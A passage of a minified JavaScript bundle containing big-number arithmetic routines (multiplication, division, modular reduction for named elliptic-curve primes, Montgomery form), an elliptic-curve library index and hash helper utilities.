                u = (o + (r >>> 13) | 0) + (Me >>> 26) | 0, Me &= 67108863, i = Math.imul(L, ne), r = Math.imul(L, ie), r = r + Math.imul(N, ne) | 0, o = Math.imul(N, ie), i = i + Math.imul(j, oe) | 0, r = r + Math.imul(j, ae) | 0, r = r + Math.imul(q, oe) | 0, o = o + Math.imul(q, ae) | 0, i = i + Math.imul(I, ce) | 0, r = r + Math.imul(I, ue) | 0, r = r + Math.imul(D, ce) | 0, o = o + Math.imul(D, ue) | 0, i = i + Math.imul(M, de) | 0, r = r + Math.imul(M, fe) | 0, r = r + Math.imul(R, de) | 0, o = o + Math.imul(R, fe) | 0, i = i + Math.imul(A, pe) | 0, r = r + Math.imul(A, be) | 0, r = r + Math.imul(E, pe) | 0, o = o + Math.imul(E, be) | 0; var Re = (u + i | 0) + ((8191 & r) << 13) | 0;
                u = (o + (r >>> 13) | 0) + (Re >>> 26) | 0, Re &= 67108863, i = Math.imul(L, oe), r = Math.imul(L, ae), r = r + Math.imul(N, oe) | 0, o = Math.imul(N, ae), i = i + Math.imul(j, ce) | 0, r = r + Math.imul(j, ue) | 0, r = r + Math.imul(q, ce) | 0, o = o + Math.imul(q, ue) | 0, i = i + Math.imul(I, de) | 0, r = r + Math.imul(I, fe) | 0, r = r + Math.imul(D, de) | 0, o = o + Math.imul(D, fe) | 0, i = i + Math.imul(M, pe) | 0, r = r + Math.imul(M, be) | 0, r = r + Math.imul(R, pe) | 0, o = o + Math.imul(R, be) | 0; var Pe = (u + i | 0) + ((8191 & r) << 13) | 0;
                u = (o + (r >>> 13) | 0) + (Pe >>> 26) | 0, Pe &= 67108863, i = Math.imul(L, ce), r = Math.imul(L, ue), r = r + Math.imul(N, ce) | 0, o = Math.imul(N, ue), i = i + Math.imul(j, de) | 0, r = r + Math.imul(j, fe) | 0, r = r + Math.imul(q, de) | 0, o = o + Math.imul(q, fe) | 0, i = i + Math.imul(I, pe) | 0, r = r + Math.imul(I, be) | 0, r = r + Math.imul(D, pe) | 0, o = o + Math.imul(D, be) | 0; var Ie = (u + i | 0) + ((8191 & r) << 13) | 0;
                u = (o + (r >>> 13) | 0) + (Ie >>> 26) | 0, Ie &= 67108863, i = Math.imul(L, de), r = Math.imul(L, fe), r = r + Math.imul(N, de) | 0, o = Math.imul(N, fe), i = i + Math.imul(j, pe) | 0, r = r + Math.imul(j, be) | 0, r = r + Math.imul(q, pe) | 0, o = o + Math.imul(q, be) | 0; var De = (u + i | 0) + ((8191 & r) << 13) | 0;
                u = (o + (r >>> 13) | 0) + (De >>> 26) | 0, De &= 67108863, i = Math.imul(L, pe), r = Math.imul(L, be), r = r + Math.imul(N, pe) | 0, o = Math.imul(N, be); var Oe = (u + i | 0) + ((8191 & r) << 13) | 0; return u = (o + (r >>> 13) | 0) + (Oe >>> 26) | 0, Oe &= 67108863, c[0] = me, c[1] = ge, c[2] = ve, c[3] = ye, c[4] = we, c[5] = xe, c[6] = Se, c[7] = _e, c[8] = ke, c[9] = Ce, c[10] = Ae, c[11] = Ee, c[12] = Te, c[13] = Me, c[14] = Re, c[15] = Pe, c[16] = Ie, c[17] = De, c[18] = Oe, 0 !== u && (c[19] = u, n.length++), n };
            Math.imul || (k = u), o.prototype.mulTo = function(e, t) { var n = this.length + e.length; return 10 === this.length && 10 === e.length ? k(this, e, t) : n < 63 ? u(this, e, t) : n < 1024 ? l(this, e, t) : d(this, e, t) }, f.prototype.makeRBT = function(e) { for (var t = new Array(e), n = o.prototype._countBits(e) - 1, i = 0; i < e; i++) t[i] = this.revBin(i, n, e); return t }, f.prototype.revBin = function(e, t, n) { if (0 === e || e === n - 1) return e; for (var i = 0, r = 0; r < t; r++) i |= (1 & e) << t - r - 1, e >>= 1; return i }, f.prototype.permute = function(e, t, n, i, r, o) { for (var a = 0; a < o; a++) i[a] = t[e[a]], r[a] = n[e[a]] }, f.prototype.transform = function(e, t, n, i, r, o) { this.permute(o, e, t, n, i, r); for (var a = 1; a < r; a <<= 1)
                    for (var s = a << 1, c = Math.cos(2 * Math.PI / s), u = Math.sin(2 * Math.PI / s), l = 0; l < r; l += s)
                        for (var d = c, f = u, h = 0; h < a; h++) { var p = n[l + h],
                                b = i[l + h],
                                m = n[l + h + a],
                                g = i[l + h + a],
                                v = d * m - f * g;
                            g = d * g + f * m, m = v, n[l + h] = p + m, i[l + h] = b + g, n[l + h + a] = p - m, i[l + h + a] = b - g, h !== s && (v = c * d - u * f, f = c * f + u * d, d = v) } }, f.prototype.guessLen13b = function(e, t) { var n = 1 | Math.max(t, e),
                    i = 1 & n,
                    r = 0; for (n = n / 2 | 0; n; n >>>= 1) r++; return 1 << r + 1 + i }, f.prototype.conjugate = function(e, t, n) { if (!(n <= 1))
                    for (var i = 0; i < n / 2; i++) { var r = e[i];
                        e[i] = e[n - i - 1], e[n - i - 1] = r, r = t[i], t[i] = -t[n - i - 1], t[n - i - 1] = -r } }, f.prototype.normalize13b = function(e, t) { for (var n = 0, i = 0; i < t / 2; i++) { var r = 8192 * Math.round(e[2 * i + 1] / t) + Math.round(e[2 * i] / t) + n;
                    e[i] = 67108863 & r, n = r < 67108864 ? 0 : r / 67108864 | 0 } return e }, f.prototype.convert13b = function(e, t, n, r) { for (var o = 0, a = 0; a < t; a++) o += 0 | e[a], n[2 * a] = 8191 & o, o >>>= 13, n[2 * a + 1] = 8191 & o, o >>>= 13; for (a = 2 * t; a < r; ++a) n[a] = 0;
                i(0 === o), i(0 == (-8192 & o)) }, f.prototype.stub = function(e) { for (var t = new Array(e), n = 0; n < e; n++) t[n] = 0; return t }, f.prototype.mulp = function(e, t, n) { var i = 2 * this.guessLen13b(e.length, t.length),
                    r = this.makeRBT(i),
                    o = this.stub(i),
                    a = new Array(i),
                    s = new Array(i),
                    c = new Array(i),
                    u = new Array(i),
                    l = new Array(i),
                    d = new Array(i),
                    f = n.words;
                f.length = i, this.convert13b(e.words, e.length, a, i), this.convert13b(t.words, t.length, u, i), this.transform(a, o, s, c, i, r), this.transform(u, o, l, d, i, r); for (var h = 0; h < i; h++) { var p = s[h] * l[h] - c[h] * d[h];
                    c[h] = s[h] * d[h] + c[h] * l[h], s[h] = p } return this.conjugate(s, c, i), this.transform(s, c, f, o, i, r), this.conjugate(f, o, i), this.normalize13b(f, i), n.negative = e.negative ^ t.negative, n.length = e.length + t.length, n.strip() }, o.prototype.mul = function(e) { var t = new o(null); return t.words = new Array(this.length + e.length), this.mulTo(e, t) }, o.prototype.mulf = function(e) { var t = new o(null); return t.words = new Array(this.length + e.length), d(this, e, t) }, o.prototype.imul = function(e) { return this.clone().mulTo(e, this) }, o.prototype.imuln = function(e) { i("number" == typeof e), i(e < 67108864); for (var t = 0, n = 0; n < this.length; n++) { var r = (0 | this.words[n]) * e,
                        o = (67108863 & r) + (67108863 & t);
                    t >>= 26, t += r / 67108864 | 0, t += o >>> 26, this.words[n] = 67108863 & o } return 0 !== t && (this.words[n] = t, this.length++), this }, o.prototype.muln = function(e) { return this.clone().imuln(e) }, o.prototype.sqr = function() { return this.mul(this) }, o.prototype.isqr = function() { return this.imul(this.clone()) }, o.prototype.pow = function(e) { var t = c(e); if (0 === t.length) return new o(1); for (var n = this, i = 0; i < t.length && 0 === t[i]; i++, n = n.sqr()); if (++i < t.length)
                    for (var r = n.sqr(); i < t.length; i++, r = r.sqr()) 0 !== t[i] && (n = n.mul(r)); return n }, o.prototype.iushln = function(e) { i("number" == typeof e && e >= 0); var t, n = e % 26,
                    r = (e - n) / 26,
                    o = 67108863 >>> 26 - n << 26 - n; if (0 !== n) { var a = 0; for (t = 0; t < this.length; t++) { var s = this.words[t] & o,
                            c = (0 | this.words[t]) - s << n;
                        this.words[t] = c | a, a = s >>> 26 - n } a && (this.words[t] = a, this.length++) } if (0 !== r) { for (t = this.length - 1; t >= 0; t--) this.words[t + r] = this.words[t]; for (t = 0; t < r; t++) this.words[t] = 0;
                    this.length += r } return this.strip() }, o.prototype.ishln = function(e) { return i(0 === this.negative), this.iushln(e) }, o.prototype.iushrn = function(e, t, n) { i("number" == typeof e && e >= 0); var r;
                r = t ? (t - t % 26) / 26 : 0; var o = e % 26,
                    a = Math.min((e - o) / 26, this.length),
                    s = 67108863 ^ 67108863 >>> o << o,
                    c = n; if (r -= a, r = Math.max(0, r), c) { for (var u = 0; u < a; u++) c.words[u] = this.words[u];
                    c.length = a } if (0 === a);
                else if (this.length > a)
                    for (this.length -= a, u = 0; u < this.length; u++) this.words[u] = this.words[u + a];
                else this.words[0] = 0, this.length = 1; var l = 0; for (u = this.length - 1; u >= 0 && (0 !== l || u >= r); u--) { var d = 0 | this.words[u];
                    this.words[u] = l << 26 - o | d >>> o, l = d & s } return c && 0 !== l && (c.words[c.length++] = l), 0 === this.length && (this.words[0] = 0, this.length = 1), this.strip() }, o.prototype.ishrn = function(e, t, n) { return i(0 === this.negative), this.iushrn(e, t, n) }, o.prototype.shln = function(e) { return this.clone().ishln(e) }, o.prototype.ushln = function(e) { return this.clone().iushln(e) }, o.prototype.shrn = function(e) { return this.clone().ishrn(e) }, o.prototype.ushrn = function(e) { return this.clone().iushrn(e) }, o.prototype.testn = function(e) { i("number" == typeof e && e >= 0); var t = e % 26,
                    n = (e - t) / 26,
                    r = 1 << t; return !(this.length <= n) && !!(this.words[n] & r) }, o.prototype.imaskn = function(e) { i("number" == typeof e && e >= 0); var t = e % 26,
                    n = (e - t) / 26; if (i(0 === this.negative, "imaskn works only with positive numbers"), this.length <= n) return this; if (0 !== t && n++, this.length = Math.min(n, this.length), 0 !== t) { var r = 67108863 ^ 67108863 >>> t << t;
                    this.words[this.length - 1] &= r } return this.strip() }, o.prototype.maskn = function(e) { return this.clone().imaskn(e) }, o.prototype.iaddn = function(e) { return i("number" == typeof e), i(e < 67108864), e < 0 ? this.isubn(-e) : 0 !== this.negative ? 1 === this.length && (0 | this.words[0]) < e ? (this.words[0] = e - (0 | this.words[0]), this.negative = 0, this) : (this.negative = 0, this.isubn(e), this.negative = 1, this) : this._iaddn(e) }, o.prototype._iaddn = function(e) { this.words[0] += e; for (var t = 0; t < this.length && this.words[t] >= 67108864; t++) this.words[t] -= 67108864, t === this.length - 1 ? this.words[t + 1] = 1 : this.words[t + 1]++; return this.length = Math.max(this.length, t + 1), this }, o.prototype.isubn = function(e) { if (i("number" == typeof e), i(e < 67108864), e < 0) return this.iaddn(-e); if (0 !== this.negative) return this.negative = 0, this.iaddn(e), this.negative = 1, this; if (this.words[0] -= e, 1 === this.length && this.words[0] < 0) this.words[0] = -this.words[0], this.negative = 1;
                else
                    for (var t = 0; t < this.length && this.words[t] < 0; t++) this.words[t] += 67108864, this.words[t + 1] -= 1; return this.strip() }, o.prototype.addn = function(e) { return this.clone().iaddn(e) }, o.prototype.subn = function(e) { return this.clone().isubn(e) }, o.prototype.iabs = function() { return this.negative = 0, this }, o.prototype.abs = function() { return this.clone().iabs() }, o.prototype._ishlnsubmul = function(e, t, n) { var r, o = e.length + n;
                this._expand(o); var a, s = 0; for (r = 0; r < e.length; r++) { a = (0 | this.words[r + n]) + s; var c = (0 | e.words[r]) * t;
                    a -= 67108863 & c, s = (a >> 26) - (c / 67108864 | 0), this.words[r + n] = 67108863 & a } for (; r < this.length - n; r++) a = (0 | this.words[r + n]) + s, s = a >> 26, this.words[r + n] = 67108863 & a; if (0 === s) return this.strip(); for (i(-1 === s), s = 0, r = 0; r < this.length; r++) a = -(0 | this.words[r]) + s, s = a >> 26, this.words[r] = 67108863 & a; return this.negative = 1, this.strip() }, o.prototype._wordDiv = function(e, t) { var n = this.length - e.length,
                    i = this.clone(),
                    r = e,
                    a = 0 | r.words[r.length - 1];
                0 !== (n = 26 - this._countBits(a)) && (r = r.ushln(n), i.iushln(n), a = 0 | r.words[r.length - 1]); var s, c = i.length - r.length; if ("mod" !== t) { s = new o(null), s.length = c + 1, s.words = new Array(s.length); for (var u = 0; u < s.length; u++) s.words[u] = 0 } var l = i.clone()._ishlnsubmul(r, 1, c);
                0 === l.negative && (i = l, s && (s.words[c] = 1)); for (var d = c - 1; d >= 0; d--) { var f = 67108864 * (0 | i.words[r.length + d]) + (0 | i.words[r.length + d - 1]); for (f = Math.min(f / a | 0, 67108863), i._ishlnsubmul(r, f, d); 0 !== i.negative;) f--, i.negative = 0, i._ishlnsubmul(r, 1, d), i.isZero() || (i.negative ^= 1);
                    s && (s.words[d] = f) } return s && s.strip(), i.strip(), "div" !== t && 0 !== n && i.iushrn(n), { div: s || null, mod: i } }, o.prototype.divmod = function(e, t, n) { if (i(!e.isZero()), this.isZero()) return { div: new o(0), mod: new o(0) }; var r, a, s; return 0 !== this.negative && 0 === e.negative ? (s = this.neg().divmod(e, t), "mod" !== t && (r = s.div.neg()), "div" !== t && (a = s.mod.neg(), n && 0 !== a.negative && a.iadd(e)), { div: r, mod: a }) : 0 === this.negative && 0 !== e.negative ? (s = this.divmod(e.neg(), t), "mod" !== t && (r = s.div.neg()), { div: r, mod: s.mod }) : 0 != (this.negative & e.negative) ? (s = this.neg().divmod(e.neg(), t), "div" !== t && (a = s.mod.neg(), n && 0 !== a.negative && a.isub(e)), { div: s.div, mod: a }) : e.length > this.length || this.cmp(e) < 0 ? { div: new o(0), mod: this } : 1 === e.length ? "div" === t ? { div: this.divn(e.words[0]), mod: null } : "mod" === t ? { div: null, mod: new o(this.modn(e.words[0])) } : { div: this.divn(e.words[0]), mod: new o(this.modn(e.words[0])) } : this._wordDiv(e, t) }, o.prototype.div = function(e) { return this.divmod(e, "div", !1).div }, o.prototype.mod = function(e) { return this.divmod(e, "mod", !1).mod }, o.prototype.umod = function(e) { return this.divmod(e, "mod", !0).mod }, o.prototype.divRound = function(e) { var t = this.divmod(e); if (t.mod.isZero()) return t.div; var n = 0 !== t.div.negative ? t.mod.isub(e) : t.mod,
                    i = e.ushrn(1),
                    r = e.andln(1),
                    o = n.cmp(i); return o < 0 || 1 === r && 0 === o ? t.div : 0 !== t.div.negative ? t.div.isubn(1) : t.div.iaddn(1) }, o.prototype.modn = function(e) { i(e <= 67108863); for (var t = (1 << 26) % e, n = 0, r = this.length - 1; r >= 0; r--) n = (t * n + (0 | this.words[r])) % e; return n }, o.prototype.idivn = function(e) { i(e <= 67108863); for (var t = 0, n = this.length - 1; n >= 0; n--) { var r = (0 | this.words[n]) + 67108864 * t;
                    this.words[n] = r / e | 0, t = r % e } return this.strip() }, o.prototype.divn = function(e) { return this.clone().idivn(e) }, o.prototype.egcd = function(e) { i(0 === e.negative), i(!e.isZero()); var t = this,
                    n = e.clone();
                t = 0 !== t.negative ? t.umod(e) : t.clone(); for (var r = new o(1), a = new o(0), s = new o(0), c = new o(1), u = 0; t.isEven() && n.isEven();) t.iushrn(1), n.iushrn(1), ++u; for (var l = n.clone(), d = t.clone(); !t.isZero();) { for (var f = 0, h = 1; 0 == (t.words[0] & h) && f < 26; ++f, h <<= 1); if (f > 0)
                        for (t.iushrn(f); f-- > 0;)(r.isOdd() || a.isOdd()) && (r.iadd(l), a.isub(d)), r.iushrn(1), a.iushrn(1); for (var p = 0, b = 1; 0 == (n.words[0] & b) && p < 26; ++p, b <<= 1); if (p > 0)
                        for (n.iushrn(p); p-- > 0;)(s.isOdd() || c.isOdd()) && (s.iadd(l), c.isub(d)), s.iushrn(1), c.iushrn(1);
                    t.cmp(n) >= 0 ? (t.isub(n), r.isub(s), a.isub(c)) : (n.isub(t), s.isub(r), c.isub(a)) } return { a: s, b: c, gcd: n.iushln(u) } }, o.prototype._invmp = function(e) { i(0 === e.negative), i(!e.isZero()); var t = this,
                    n = e.clone();
                t = 0 !== t.negative ? t.umod(e) : t.clone(); for (var r = new o(1), a = new o(0), s = n.clone(); t.cmpn(1) > 0 && n.cmpn(1) > 0;) { for (var c = 0, u = 1; 0 == (t.words[0] & u) && c < 26; ++c, u <<= 1); if (c > 0)
                        for (t.iushrn(c); c-- > 0;) r.isOdd() && r.iadd(s), r.iushrn(1); for (var l = 0, d = 1; 0 == (n.words[0] & d) && l < 26; ++l, d <<= 1); if (l > 0)
                        for (n.iushrn(l); l-- > 0;) a.isOdd() && a.iadd(s), a.iushrn(1);
                    t.cmp(n) >= 0 ? (t.isub(n), r.isub(a)) : (n.isub(t), a.isub(r)) } var f; return f = 0 === t.cmpn(1) ? r : a, f.cmpn(0) < 0 && f.iadd(e), f }, o.prototype.gcd = function(e) { if (this.isZero()) return e.abs(); if (e.isZero()) return this.abs(); var t = this.clone(),
                    n = e.clone();
                t.negative = 0, n.negative = 0; for (var i = 0; t.isEven() && n.isEven(); i++) t.iushrn(1), n.iushrn(1); for (;;) { for (; t.isEven();) t.iushrn(1); for (; n.isEven();) n.iushrn(1); var r = t.cmp(n); if (r < 0) { var o = t;
                        t = n, n = o } else if (0 === r || 0 === n.cmpn(1)) break;
                    t.isub(n) } return n.iushln(i) }, o.prototype.invm = function(e) { return this.egcd(e).a.umod(e) }, o.prototype.isEven = function() { return 0 == (1 & this.words[0]) }, o.prototype.isOdd = function() { return 1 == (1 & this.words[0]) }, o.prototype.andln = function(e) { return this.words[0] & e }, o.prototype.bincn = function(e) { i("number" == typeof e); var t = e % 26,
                    n = (e - t) / 26,
                    r = 1 << t; if (this.length <= n) return this._expand(n + 1), this.words[n] |= r, this; for (var o = r, a = n; 0 !== o && a < this.length; a++) { var s = 0 | this.words[a];
                    s += o, o = s >>> 26, s &= 67108863, this.words[a] = s } return 0 !== o && (this.words[a] = o, this.length++), this }, o.prototype.isZero = function() { return 1 === this.length && 0 === this.words[0] }, o.prototype.cmpn = function(e) { var t = e < 0; if (0 !== this.negative && !t) return -1; if (0 === this.negative && t) return 1;
                this.strip(); var n; if (this.length > 1) n = 1;
                else { t && (e = -e), i(e <= 67108863, "Number is too big"); var r = 0 | this.words[0];
                    n = r === e ? 0 : r < e ? -1 : 1 } return 0 !== this.negative ? 0 | -n : n }, o.prototype.cmp = function(e) { if (0 !== this.negative && 0 === e.negative) return -1; if (0 === this.negative && 0 !== e.negative) return 1; var t = this.ucmp(e); return 0 !== this.negative ? 0 | -t : t }, o.prototype.ucmp = function(e) { if (this.length > e.length) return 1; if (this.length < e.length) return -1; for (var t = 0, n = this.length - 1; n >= 0; n--) { var i = 0 | this.words[n],
                        r = 0 | e.words[n]; if (i !== r) { i < r ? t = -1 : i > r && (t = 1); break } } return t }, o.prototype.gtn = function(e) { return 1 === this.cmpn(e) }, o.prototype.gt = function(e) { return 1 === this.cmp(e) }, o.prototype.gten = function(e) { return this.cmpn(e) >= 0 }, o.prototype.gte = function(e) { return this.cmp(e) >= 0 }, o.prototype.ltn = function(e) { return -1 === this.cmpn(e) }, o.prototype.lt = function(e) { return -1 === this.cmp(e) }, o.prototype.lten = function(e) { return this.cmpn(e) <= 0 }, o.prototype.lte = function(e) { return this.cmp(e) <= 0 }, o.prototype.eqn = function(e) { return 0 === this.cmpn(e) }, o.prototype.eq = function(e) { return 0 === this.cmp(e) }, o.red = function(e) { return new v(e) }, o.prototype.toRed = function(e) { return i(!this.red, "Already a number in reduction context"), i(0 === this.negative, "red works only with positives"), e.convertTo(this)._forceRed(e) }, o.prototype.fromRed = function() { return i(this.red, "fromRed works only with numbers in reduction context"), this.red.convertFrom(this) }, o.prototype._forceRed = function(e) { return this.red = e, this }, o.prototype.forceRed = function(e) { return i(!this.red, "Already a number in reduction context"), this._forceRed(e) }, o.prototype.redAdd = function(e) { return i(this.red, "redAdd works only with red numbers"), this.red.add(this, e) }, o.prototype.redIAdd = function(e) { return i(this.red, "redIAdd works only with red numbers"), this.red.iadd(this, e) }, o.prototype.redSub = function(e) { return i(this.red, "redSub works only with red numbers"), this.red.sub(this, e) }, o.prototype.redISub = function(e) { return i(this.red, "redISub works only with red numbers"), this.red.isub(this, e) }, o.prototype.redShl = function(e) { return i(this.red, "redShl works only with red numbers"), this.red.shl(this, e) }, o.prototype.redMul = function(e) { return i(this.red, "redMul works only with red numbers"), this.red._verify2(this, e), this.red.mul(this, e) }, o.prototype.redIMul = function(e) { return i(this.red, "redMul works only with red numbers"), this.red._verify2(this, e), this.red.imul(this, e) }, o.prototype.redSqr = function() { return i(this.red, "redSqr works only with red numbers"), this.red._verify1(this), this.red.sqr(this) }, o.prototype.redISqr = function() { return i(this.red, "redISqr works only with red numbers"), this.red._verify1(this), this.red.isqr(this) }, o.prototype.redSqrt = function() { return i(this.red, "redSqrt works only with red numbers"), this.red._verify1(this), this.red.sqrt(this) }, o.prototype.redInvm = function() { return i(this.red, "redInvm works only with red numbers"), this.red._verify1(this), this.red.invm(this) }, o.prototype.redNeg = function() { return i(this.red, "redNeg works only with red numbers"), this.red._verify1(this), this.red.neg(this) }, o.prototype.redPow = function(e) { return i(this.red && !e.red, "redPow(normalNum)"), this.red._verify1(this), this.red.pow(this, e) }; var C = { k256: null, p224: null, p192: null, p25519: null };
            h.prototype._tmp = function() { var e = new o(null); return e.words = new Array(Math.ceil(this.n / 13)), e }, h.prototype.ireduce = function(e) { var t, n = e;
                do { this.split(n, this.tmp), n = this.imulK(n), n = n.iadd(this.tmp), t = n.bitLength() } while (t > this.n); var i = t < this.n ? -1 : n.ucmp(this.p); return 0 === i ? (n.words[0] = 0, n.length = 1) : i > 0 ? n.isub(this.p) : n.strip(), n }, h.prototype.split = function(e, t) { e.iushrn(this.n, 0, t) }, h.prototype.imulK = function(e) { return e.imul(this.k) }, r(p, h), p.prototype.split = function(e, t) { for (var n = Math.min(e.length, 9), i = 0; i < n; i++) t.words[i] = e.words[i]; if (t.length = n, e.length <= 9) return e.words[0] = 0, void(e.length = 1); var r = e.words[9]; for (t.words[t.length++] = 4194303 & r, i = 10; i < e.length; i++) { var o = 0 | e.words[i];
                    e.words[i - 10] = (4194303 & o) << 4 | r >>> 22, r = o } r >>>= 22, e.words[i - 10] = r, 0 === r && e.length > 10 ? e.length -= 10 : e.length -= 9 }, p.prototype.imulK = function(e) { e.words[e.length] = 0, e.words[e.length + 1] = 0, e.length += 2; for (var t = 0, n = 0; n < e.length; n++) { var i = 0 | e.words[n];
                    t += 977 * i, e.words[n] = 67108863 & t, t = 64 * i + (t / 67108864 | 0) } return 0 === e.words[e.length - 1] && (e.length--, 0 === e.words[e.length - 1] && e.length--), e }, r(b, h), r(m, h), r(g, h), g.prototype.imulK = function(e) { for (var t = 0, n = 0; n < e.length; n++) { var i = 19 * (0 | e.words[n]) + t,
                        r = 67108863 & i;
                    i >>>= 26, e.words[n] = r, t = i } return 0 !== t && (e.words[e.length++] = t), e }, o._prime = function(e) { if (C[e]) return C[e]; var t; if ("k256" === e) t = new p;
                else if ("p224" === e) t = new b;
                else if ("p192" === e) t = new m;
                else { if ("p25519" !== e) throw new Error("Unknown prime " + e);
                    t = new g } return C[e] = t, t }, v.prototype._verify1 = function(e) { i(0 === e.negative, "red works only with positives"), i(e.red, "red works only with red numbers") }, v.prototype._verify2 = function(e, t) { i(0 == (e.negative | t.negative), "red works only with positives"), i(e.red && e.red === t.red, "red works only with red numbers") }, v.prototype.imod = function(e) { return this.prime ? this.prime.ireduce(e)._forceRed(this) : e.umod(this.m)._forceRed(this) }, v.prototype.neg = function(e) { return e.isZero() ? e.clone() : this.m.sub(e)._forceRed(this) }, v.prototype.add = function(e, t) { this._verify2(e, t); var n = e.add(t); return n.cmp(this.m) >= 0 && n.isub(this.m), n._forceRed(this) }, v.prototype.iadd = function(e, t) { this._verify2(e, t); var n = e.iadd(t); return n.cmp(this.m) >= 0 && n.isub(this.m), n }, v.prototype.sub = function(e, t) { this._verify2(e, t); var n = e.sub(t); return n.cmpn(0) < 0 && n.iadd(this.m), n._forceRed(this) }, v.prototype.isub = function(e, t) { this._verify2(e, t); var n = e.isub(t); return n.cmpn(0) < 0 && n.iadd(this.m), n }, v.prototype.shl = function(e, t) { return this._verify1(e), this.imod(e.ushln(t)) }, v.prototype.imul = function(e, t) { return this._verify2(e, t), this.imod(e.imul(t)) }, v.prototype.mul = function(e, t) { return this._verify2(e, t), this.imod(e.mul(t)) }, v.prototype.isqr = function(e) { return this.imul(e, e.clone()) }, v.prototype.sqr = function(e) { return this.mul(e, e) }, v.prototype.sqrt = function(e) { if (e.isZero()) return e.clone(); var t = this.m.andln(3); if (i(t % 2 == 1), 3 === t) { var n = this.m.add(new o(1)).iushrn(2); return this.pow(e, n) } for (var r = this.m.subn(1), a = 0; !r.isZero() && 0 === r.andln(1);) a++, r.iushrn(1);
                i(!r.isZero()); var s = new o(1).toRed(this),
                    c = s.redNeg(),
                    u = this.m.subn(1).iushrn(1),
                    l = this.m.bitLength(); for (l = new o(2 * l * l).toRed(this); 0 !== this.pow(l, u).cmp(c);) l.redIAdd(c); for (var d = this.pow(l, r), f = this.pow(e, r.addn(1).iushrn(1)), h = this.pow(e, r), p = a; 0 !== h.cmp(s);) { for (var b = h, m = 0; 0 !== b.cmp(s); m++) b = b.redSqr();
                    i(m < p); var g = this.pow(d, new o(1).iushln(p - m - 1));
                    f = f.redMul(g), d = g.redSqr(), h = h.redMul(d), p = m } return f }, v.prototype.invm = function(e) { var t = e._invmp(this.m); return 0 !== t.negative ? (t.negative = 0, this.imod(t).redNeg()) : this.imod(t) }, v.prototype.pow = function(e, t) { if (t.isZero()) return new o(1).toRed(this); if (0 === t.cmpn(1)) return e.clone(); var n = new Array(16);
                n[0] = new o(1).toRed(this), n[1] = e; for (var i = 2; i < n.length; i++) n[i] = this.mul(n[i - 1], e); var r = n[0],
                    a = 0,
                    s = 0,
                    c = t.bitLength() % 26; for (0 === c && (c = 26), i = t.length - 1; i >= 0; i--) { for (var u = t.words[i], l = c - 1; l >= 0; l--) { var d = u >> l & 1;
                        r !== n[0] && (r = this.sqr(r)), 0 !== d || 0 !== a ? (a <<= 1, a |= d, (4 === ++s || 0 === i && 0 === l) && (r = this.mul(r, n[a]), s = 0, a = 0)) : s = 0 } c = 26 } return r }, v.prototype.convertTo = function(e) { var t = e.umod(this.m); return t === e ? t.clone() : t }, v.prototype.convertFrom = function(e) { var t = e.clone(); return t.red = null, t }, o.mont = function(e) { return new y(e) }, r(y, v), y.prototype.convertTo = function(e) { return this.imod(e.ushln(this.shift)) }, y.prototype.convertFrom = function(e) { var t = this.imod(e.mul(this.rinv)); return t.red = null, t }, y.prototype.imul = function(e, t) { if (e.isZero() || t.isZero()) return e.words[0] = 0, e.length = 1, e; var n = e.imul(t),
                    i = n.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),
                    r = n.isub(i).iushrn(this.shift),
                    o = r; return r.cmp(this.m) >= 0 ? o = r.isub(this.m) : r.cmpn(0) < 0 && (o = r.iadd(this.m)), o._forceRed(this) }, y.prototype.mul = function(e, t) { if (e.isZero() || t.isZero()) return new o(0)._forceRed(this); var n = e.mul(t),
                    i = n.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),
                    r = n.isub(i).iushrn(this.shift),
                    a = r; return r.cmp(this.m) >= 0 ? a = r.isub(this.m) : r.cmpn(0) < 0 && (a = r.iadd(this.m)), a._forceRed(this) }, y.prototype.invm = function(e) { return this.imod(e._invmp(this.m).mul(this.r2))._forceRed(this) } }(void 0 === e || e, this) }).call(t, n(114)(e)) }, function(e, t, n) { "use strict"; var i = t;
    i.version = n(121).version, i.utils = n(122), i.rand = n(57), i.curve = n(23), i.curves = n(127), i.ec = n(135), i.eddsa = n(139) }, function(e, t) {
    function n(e, t) { if (!e) throw new Error(t || "Assertion failed") } e.exports = n, n.equal = function(e, t, n) { if (e != t) throw new Error(n || "Assertion failed: " + e + " != " + t) } }, function(e, t, n) { "use strict";

    function i(e, t) { if (Array.isArray(e)) return e.slice(); if (!e) return []; var n = []; if ("string" == typeof e)
            if (t) { if ("hex" === t)
                    for (e = e.replace(/[^a-z0-9]+/gi, ""), e.length % 2 != 0 && (e = "0" + e), i = 0; i < e.length; i += 2) n.push(parseInt(e[i] + e[i + 1], 16)) } else
                for (var i = 0; i < e.length; i++) { var r = e.charCodeAt(i),
                        o = r >> 8,
                        a = 255 & r;
                    o ? n.push(o, a) : n.push(a) } else
                    for (i = 0; i < e.length; i++) n[i] = 0 | e[i]; return n }

    function r(e) { for (var t = "", n = 0; n < e.length; n++) t += s(e[n].toString(16)); return t }

    function o(e) { return (e >>> 24 | e >>> 8 & 65280 | e << 8 & 16711680 | (255 & e) << 24) >>> 0 }

    function a(e, t) { for (var n = "", i = 0; i < e.length; i++) { var r = e[i]; "little" === t && (r = o(r)), n += c(r.toString(16)) } return n }

    function s(e) { return 1 === e.length ? "0" + e : e }

    function c(e) { return 7 === e.length ? "0" + e : 6 === e.length ? "00" + e : 5 === e.length ? "000" + e : 4 === e.length ? "0000" + e : 3 === e.length ? "00000" + e : 2 === e.length ? "000000" + e : 1 === e.length ? "0000000" + e : e }

    function u(e, t, n, i) { var r = n - t;
        T(r % 4 == 0); for (var o = new Array(r / 4), a = 0, s = t; a < o.length; a++, s += 4) { var c;
            c = "big" === i ? e[s] << 24 | e[s + 1] << 16 | e[s + 2] << 8 | e[s + 3] : e[s + 3] << 24 | e[s + 2] << 16 | e[s + 1] << 8 | e[s], o[a] = c >>> 0 } return o }

    function l(e, t) { for (var n = new Array(4 * e.length), i = 0, r = 0; i < e.length; i++, r += 4) { var o = e[i]; "big" === t ? (n[r] = o >>> 24, n[r + 1] = o >>> 16 & 255, n[r + 2] = o >>> 8 & 255, n[r + 3] = 255 & o) : (n[r + 3] = o >>> 24, n[r + 2] = o >>> 16 & 255, n[r + 1] = o >>> 8 & 255, n[r] = 255 & o) } return n }

    function d(e, t) { return e >>> t | e << 32 - t }

    function f(e, t) { return e << t | e >>> 32 - t }

    function h(e, t) { return e + t >>> 0 }

    function p(e, t, n) { return e + t + n >>> 0 }

    function b(e, t, n, i) { return e + t + n + i >>> 0 }

